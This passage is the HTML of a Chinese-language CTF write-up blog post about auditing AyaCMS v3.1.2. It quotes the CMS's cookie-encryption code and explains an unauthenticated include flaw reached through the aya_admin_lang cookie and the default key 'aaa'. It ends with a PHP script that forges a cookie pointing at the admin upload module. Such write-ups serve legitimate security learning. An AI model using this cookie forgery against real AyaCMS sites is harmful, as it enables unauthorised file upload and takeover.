@@ -1,0 +1,1164 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next pisces" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="cms," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="这周末打NCTF从零开始审了个cms框架，经典没找到文章，硬审，成功审到漏洞，结果最后一头创死在include门前（离打通就差五行代码！五行！痛！痛！）好在这两天也并不是一无所获，以此文章记录我在代码审计时的思路和所做的尝试。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通关ayacms">
+<meta property="og:url" content="https://www.m0x01sery.com/2022/12/05/ayacms/index.html">
+<meta property="og:site_name" content="M1seryの厨房">
+<meta property="og:description" content="这周末打NCTF从零开始审了个cms框架，经典没找到文章，硬审，成功审到漏洞，结果最后一头创死在include门前（离打通就差五行代码！五行！痛！痛！）好在这两天也并不是一无所获，以此文章记录我在代码审计时的思路和所做的尝试。">
+<meta property="og:locale">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205154721.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205154550.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205160148.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205160301.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205195451.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205165459.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205171055.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205204656.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/20221205222344.png">
+<meta property="article:published_time" content="2022-12-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-12-04T16:00:00.000Z">
+<meta property="article:author" content="M1sery">
+<meta property="article:tag" content="cms">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.m0x01sery.com/images/20221205154721.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"slideDownIn","post_header":"fadeIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":null}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.m0x01sery.com/2022/12/05/ayacms/"/>
+
+
+
+
+
+  <title>通关ayacms | M1seryの厨房</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="M1seryの厨房" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">M1seryの厨房</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">愿你有一天能和你最重要的人重逢。</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-首页">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于">
+          <a href="/about/" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-归档">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友链">
+          <a href="/links/" rel="section">
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/12/05/ayacms/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M1sery">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/46666.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M1seryの厨房">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">通关ayacms</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-12-05T00:00:00+08:00">
+                2022-12-05
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2022-12-05T00:00:00+08:00">
+                2022-12-05
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这周末打NCTF从零开始审了个cms框架，经典没找到文章，硬审，成功审到漏洞，结果最后一头创死在<code>include</code>门前（离打通就差五行代码！五行！痛！痛！）好在这两天也并不是一无所获，以此文章记录我在代码审计时的思路和所做的尝试。</p>
+<span id="more"></span>
+
+<h1><span id="思路分析">思路分析</span></h1><p>初步判断，题目是主要删除了aya/moudle/member文件夹的纯净ayacms框架，版本为v3.1.2<sup>[1]</sup>。</p>
+<p>这种删子行为直接导致我们无法进行像登录、注册之类的和个人信息有关的所有操作了。</p>
+<p>而github上已知的漏洞利用<sup>[2]</sup>无一例外都存在“已登录”这个大前提（悲）。</p>
+<p>这下虽然不能直接照搬已有的payload了，大佬们走过的路仍然会带给我们很多启发。</p>
+<p>分析大佬们的payload可以事先得出以下几个结论：</p>
+<p><strong>进行敏感操作的<code>/aya/module/admin/xxx.inc.php</code>都存在授权验证，无法直接访问</strong></p>
+<p><img src="/images/20221205154721.png"></p>
+<p><strong>根目录下的<code>admin.php</code>等入口文件在执行过程中加上了授权常量的定义，即敏感操作只能由此类入口文件包含执行（类似于SSRF）</strong></p>
+<p><img src="/images/20221205154550.png"></p>
+<p><strong>通过入口文件<code>admin.php</code>传参<code>?action</code>可包含<code>/aya/module/admin/</code>下的<code>xxx.inc.php</code>文件</strong></p>
+<p><img src="/images/20221205160148.png"></p>
+<p><img src="/images/20221205160301.png"></p>
+<p>但在没有进行后台登录的情况下，传参<code>login</code>以外的action都会被遣返回登录界面。</p>
+<p><img src="/images/20221205195451.png"></p>
+<p>粗略地调试一下，得知<code>$USER</code>数组即为判断用户是否登录的标志。</p>
+<p>根目录下<code>ajax.php</code>里的文件上传也存在登录验证。</p>
+<p><img src="/images/20221205165459.png"></p>
+<p>当时结合以前伪造cookie的经验，坚定地认为只要能伪造cookie登录就能打通。结果忙活一晚上，<code>$USER</code>的数据库查询硬是没绕过去。。。</p>
+<p>不管怎样，还是先看看相关代码片段吧。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// admin.inc.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_userid</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$_username</span> = <span class="variable">$_pass</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$_USER</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_auth</span> = <span class="title function_ invoke__">get_cookie</span>(<span class="string">&#x27;auth&#x27;</span>)) &#123;</span><br><span class="line">	<span class="variable">$_auth</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\t&quot;</span>, <span class="title function_ invoke__">decrypt</span>(<span class="variable">$_auth</span>));</span><br><span class="line">	<span class="variable">$_userid</span> = <span class="keyword">isset</span>(<span class="variable">$_auth</span>[<span class="number">0</span>]) ? <span class="title function_ invoke__">intval</span>(<span class="variable">$_auth</span>[<span class="number">0</span>]) : <span class="number">0</span>;</span><br><span class="line">	<span class="variable">$_username</span> = <span class="keyword">isset</span>(<span class="variable">$_auth</span>[<span class="number">1</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_auth</span>[<span class="number">1</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$_password</span> = <span class="keyword">isset</span>(<span class="variable">$_auth</span>[<span class="number">2</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_auth</span>[<span class="number">2</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_userid</span>) &#123;</span><br><span class="line">		<span class="variable">$_USER</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">get_one</span>(<span class="string">&quot;SELECT * FROM <span class="subst">&#123;$db-&gt;pre&#125;</span>member WHERE groupid=2 &amp;&amp; itemid=<span class="subst">$_userid</span>&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$_USER</span> <span class="keyword">or</span> <span class="variable">$_USER</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="variable">$_password</span>) &#123;</span><br><span class="line">			<span class="variable">$_userid</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="title function_ invoke__">set_cookie</span>(<span class="string">&#x27;auth&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">			<span class="keyword">unset</span>(<span class="variable">$_USER</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$USER</span> = <span class="variable">$_userid</span> &gt; <span class="number">0</span> ? <span class="variable">$_USER</span> : <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;itemid&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;~Guest&#x27;</span>,</span><br><span class="line">	<span class="string">&#x27;groupid&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_auth</span>, <span class="variable">$_userid</span>, <span class="variable">$_username</span>, <span class="variable">$_password</span>, <span class="variable">$_USER</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面这几行其实才是打通题目最关键的代码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_lang</span> = <span class="title function_ invoke__">get_cookie</span>(<span class="string">&#x27;admin_lang&#x27;</span>))</span><br><span class="line">	<span class="variable">$_lang</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$_lang</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">empty</span>(<span class="variable">$_lang</span>) &amp;&amp; <span class="variable">$_lang</span> = <span class="variable">$LANG</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;AYA_LANG&#x27;</span>, <span class="variable">$_lang</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span> = AYA_ROOT . <span class="string">&#x27;lang/&#x27;</span> . AYA_LANG . <span class="string">&#x27;.inc.php&#x27;</span>))</span><br><span class="line"></span><br><span class="line">	<span class="variable">$L</span> = <span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// global.func.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_cookie</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$CFG</span>;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$CFG</span>[<span class="string">&#x27;cookie_pre&#x27;</span>] . <span class="variable">$var</span>; <span class="comment">// $CFG[&#x27;cookie_pre&#x27;] == &quot;aya_&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="variable">$var</span>]) ? <span class="variable">$_COOKIE</span>[<span class="variable">$var</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> <span class="keyword">or</span> <span class="variable">$key</span> = AYA_KEY;</span><br><span class="line">    <span class="variable">$rnd</span> = <span class="title function_ invoke__">random</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$rnd</span>[<span class="variable">$ctr</span>] . (<span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$rnd</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">kecrypt</span>(<span class="variable">$str</span>, <span class="variable">$key</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> <span class="keyword">or</span> <span class="variable">$key</span> = AYA_KEY; <span class="comment">// AYA_KEY == &quot;aaa&quot;（默认）</span></span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">kecrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$txt</span>), <span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$tmp</span> = <span class="variable">$txt</span>[<span class="variable">$i</span>];</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$txt</span>[++<span class="variable">$i</span>] ^ <span class="variable">$tmp</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">kecrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>分析相关代码可知，对于ayacms来说，用户登录即等同于传入名为<strong>aya_auth</strong>的cookie。</p>
+<p><img src="/images/20221205171055.png"></p>
+<p>后端接收到<strong>aya_auth</strong>的数据后，首先会调用<code>decrypt</code>函数解密，<code>txt</code>即为传入的cookie值，<code>AYA_KEY</code>则可直接拿到默认值<code>aaa</code>。</p>
+<p>现在<code>decrypt</code>函数长啥样已经无所谓了，更重要的是他的<code>encrypt</code>函数能帮我们直接生成可控的cookie。</p>
+<p>但即使成功构造cookie让<code>$_userid</code>短暂地置为了<code>1</code>，由于既不知道admin的密码，也不是默认密码，最后的数据库查询操作彻底把伪造<code>$USER</code>的方向堵死了。要不是<code>$_userid</code>被强制类型转换成了<code>intval</code>，可能还是有操作空间的说。而在这串代码下面五行左右的<code>include</code>敏感操作才是真正的突破口。</p>
+<p>翻译翻译就是传入<strong>aya_admin_lang</strong>这个cookie，解密后将其路径拼接为一个php文件并包含，妥妥的危险操作。</p>
+<p>再配合aya/module/admin/fst_upload.inc.php进行文件上传，即可拿下ayacms。</p>
+<p><img src="/images/20221205204656.png"></p>
+<h1><span id="利用脚本">利用脚本</span></h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params"><span class="variable">$length</span> = <span class="number">4</span>, <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$hash</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$max</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$hash</span> .= <span class="variable">$chars</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="variable">$max</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$hash</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">kecrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$ctr</span>++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$txt</span>, <span class="variable">$key</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> <span class="keyword">or</span> <span class="variable">$key</span> = AYA_KEY;</span><br><span class="line">    <span class="variable">$rnd</span> = <span class="title function_ invoke__">random</span>(<span class="number">32</span>);</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$txt</span>);</span><br><span class="line">    <span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ctr</span> = <span class="variable">$ctr</span> == <span class="number">32</span> ? <span class="number">0</span> : <span class="variable">$ctr</span>;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="variable">$rnd</span>[<span class="variable">$ctr</span>] . (<span class="variable">$txt</span>[<span class="variable">$i</span>] ^ <span class="variable">$rnd</span>[<span class="variable">$ctr</span>++]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">kecrypt</span>(<span class="variable">$str</span>, <span class="variable">$key</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// encrypt(txt, key)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="string">&quot;../module/admin/fst_upload&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/20221205222344.png"></p>
+<h1><span id="外部链接">外部链接</span></h1><p>[1] ayacms源码：<a target="_blank" rel="noopener" href="https://github.com/loadream/AyaCMS">https://github.com/loadream/AyaCMS</a></p>
+<p>[2] ayacms漏洞issue：<a target="_blank" rel="noopener" href="https://github.com/loadream/AyaCMS/issues">https://github.com/loadream/AyaCMS/issues</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/cms/" rel="tag"># cms</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/11/06/php74k2/" rel="next" title="php74内核源码阅读——变量基本结构">
+                <i class="fa fa-chevron-left"></i> php74内核源码阅读——变量基本结构
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
